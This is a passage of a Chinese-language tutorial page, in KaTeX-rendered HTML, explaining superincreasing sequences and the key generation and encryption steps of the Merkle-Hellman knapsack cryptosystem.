mtight">i</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>这个密钥也没办法解密。所以为了能够解密我们就对密钥<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>a</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">a_{i}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>进行条件的限制。</p></li><li><p><strong>超递增序列</strong>：我们规定<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>a</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">a_{i}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>是一个超递增序列，此时我们知道密钥就可以比较容易的对背包加密后的密文进行解密。</p></li></ul><p class="katex-block"><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><msub><mi>a</mi><mi>i</mi></msub><mo>&gt;</mo><munderover><mo>∑</mo><mrow><mi>k</mi><mo>=</mo><mn>1</mn></mrow><mrow><mi>i</mi><mo>−</mo><mn>1</mn></mrow></munderover><msub><mi>a</mi><mi>k</mi></msub><mspace linebreak="newline"></mspace><mtext>即</mtext><msub><mi>a</mi><mi>i</mi></msub><mo>&gt;</mo><msub><mi>a</mi><mn>1</mn></msub><mo>+</mo><msub><mi>a</mi><mn>2</mn></msub><mo>+</mo><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mo>+</mo><msub><mi>a</mi><mrow><mi>i</mi><mo>−</mo><mn>1</mn></mrow></msub></mrow><annotation encoding="application/x-tex">a_i&gt;\sum_{k=1}^{i-1}a_k\\即a_i&gt;a_1+a_2+....+a_{i-1}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6891em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">&gt;</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:3.1137820000000005em;vertical-align:-1.302113em;"></span><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.8116690000000002em;"><span style="top:-1.8478869999999998em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.0500049999999996em;"><span class="pstrut" style="height:3.05em;"></span><span><span class="mop op-symbol large-op">∑</span></span></span><span style="top:-4.300005em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.302113em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord cjk_fallback">即</span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">&gt;</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.73333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.73333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.66666em;vertical-align:-0.08333em;"></span><span class="mord">.</span><span class="mord">.</span><span class="mord">.</span><span class="mord">.</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.638891em;vertical-align:-0.208331em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.311664em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.208331em;"><span></span></span></span></span></span></span></span></span></span></span></p><ul><li>例如：<code>[1,2,5,11,20,41]</code>就是一个超递增序列。</li><li>但是这边就存在一个问题，我们用来加密消息的这个密钥<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>a</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">a_{i}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>很容易被窃取或者截获，这样就会导致一个密钥的泄露。</li></ul><h2 id="merkle-hellman背包加密算法"><a class="markdownIt-Anchor" href="#merkle-hellman背包加密算法"></a> Merkle-Hellman背包加密算法</h2><ul><li><p>为了解决密钥泄露的问题，<code>R. Merkle</code>和<code>M. Hellman</code>在一篇论文中提出了一个非对称背包加密算法。弥补了上面背包加密的密钥泄露问题。（论文会附在后面）</p></li><li><p><strong>私钥的生成</strong>：其实私钥就是上面的<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>a</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">a_{i}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>需要满足超递增序列，还有一个乘数<strong>w</strong></p></li><li><p><strong>公钥的生成</strong>：</p><ul><li>公钥的生成我们需要通过模运算，进行生成，所以我们要选定一个<strong>模数m</strong>，而这个模数要大于生成私钥的和。也就是<strong>模数m需要满足如下</strong>：</li></ul><p class="katex-block"><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>m</mi><mo>&gt;</mo><munderover><mo>∑</mo><mrow><mi>i</mi><mo>=</mo><mn>1</mn></mrow><mi>n</mi></munderover><msub><mi>a</mi><mi>i</mi></msub><mspace linebreak="newline"></mspace><mtext>即</mtext><mi>m</mi><mo>&gt;</mo><msub><mi>a</mi><mn>1</mn></msub><mo>+</mo><msub><mi>a</mi><mn>2</mn></msub><mo>+</mo><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mo>+</mo><msub><mi>a</mi><mi>n</mi></msub></mrow><annotation encoding="application/x-tex">m&gt;\sum_{i=1}^{n}a_i\\即m&gt;a_1+a_2+....+a_n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5782em;vertical-align:-0.0391em;"></span><span class="mord mathnormal">m</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">&gt;</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:2.929066em;vertical-align:-1.277669em;"></span><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.6513970000000002em;"><span style="top:-1.872331em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.050005em;"><span class="pstrut" style="height:3.05em;"></span><span><span class="mop op-symbol large-op">∑</span></span></span><span style="top:-4.3000050000000005em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.277669em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.72243em;vertical-align:-0.0391em;"></span><span class="mord cjk_fallback">即</span><span class="mord mathnormal">m</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">&gt;</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.73333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.73333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.66666em;vertical-align:-0.08333em;"></span><span class="mord">.</span><span class="mord">.</span><span class="mord">.</span><span class="mord">.</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></span></p><ul><li>然后我们要使用私钥<strong>w</strong>作为乘数，所以我们必须确保私钥</li></ul><p class="katex-block"><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>g</mi><mi>c</mi><mi>d</mi><mo stretchy="false">(</mo><mi>w</mi><mo separator="true">,</mo><mi>m</mi><mo stretchy="false">)</mo><mo>=</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">gcd(w,m)=1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mord mathnormal">c</span><span class="mord mathnormal">d</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.02691em;">w</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">m</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span></span></span></span></span></p><ul><li>生成了以上两个数我们就可以<strong>生成公钥</strong>，公钥生成的算法如下：</li></ul><p class="katex-block"><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><msub><mi>b</mi><mi>i</mi></msub><mo>=</mo><mi>w</mi><msub><mi>a</mi><mi>i</mi></msub><mtext> </mtext><mi>m</mi><mi>o</mi><mi>d</mi><mtext> </mtext><mi>m</mi></mrow><annotation encoding="application/x-tex">b_i = wa_i~mod~m</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.84444em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.84444em;vertical-align:-0.15em;"></span><span class="mord mathnormal" style="margin-right:0.02691em;">w</span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace nobreak"> </span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mspace nobreak"> </span><span class="mord mathnormal">m</span></span></span></span></span></p><ul><li>并将这个新的背包集<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>b</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">b_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.84444em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>和m作为公钥。</li></ul></li><li><p><strong>加密过程</strong>：公钥（<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>b</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">b_{i}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.84444em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>，m），私钥（<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>a</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">a_{i}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>，w）</p><ul><li>假设我们需要加密的明文是v（已经是字符串转换为整数类型），将其转换为二进制的形式，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>v</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">v_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>那么我们加密的结果为：</li></ul><p class="katex-block"><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>c</mi><mo>=</mo><munderover><mo>∑</mo><mrow><mi>i</mi><mo>=</mo><mn>1</mn></mrow><mi>n</mi></munderover><msub><mi>b</mi><mi>i</mi></msub><msub><mi>v</mi><mi>i</mi></msub><mtext> </mtext><mi>m</mi><mi>o</mi><mi>d</mi><mtext> </mtext><mi>m</mi><mspace linebreak="newline"></mspace><mtext>即</mtext><mi>c</mi><mo>=</mo><msub><mi>b</mi><mn>1</mn></msub><msub><mi>v</mi><mn>1</mn></msub><mo>+</mo><msub><mi>b</mi><mn>2</mn></msub><msub><mi>v</mi><mn>2</mn></msub><mo>+</mo><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mo>+</mo><msub><mi>b</mi><mi>n</mi></msub><msub><mi>v</mi><mi>n</mi></msub><mtext> </mtext><mi>m</mi><mi>o</mi><mi>d</mi><mtext> </mtext><mi>m</mi></mrow><annotation encoding="application/x-tex">c = \sum_{i=1}^{n}b_iv_i~mod~ m\\即c = b_1v_1+b_2v_2+...+b_nv_n~mod~m</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal">c</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:2.929066em;vertical-align:-1.277669em;"></span><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.6513970000000002em;"><span style="top:-1.872331em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.050005em;"><span class="pstrut" style="height:3.05em;"></span><span><span class="mop op-symbol large-op">∑</span></span></span><span style="top:-4.3000050000000005em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.277669em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace nobreak"> </span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mspace nobreak"> </span><span class="mord mathnormal">m</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord cjk_fallback">即</span><span class="mord mathnormal">c</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.84444em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.84444em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.66666em;vertical-align:-0.08333em;"></span><span class="mord">.</span><span class="mord">.</span><span class="mord">.</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.84444em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span 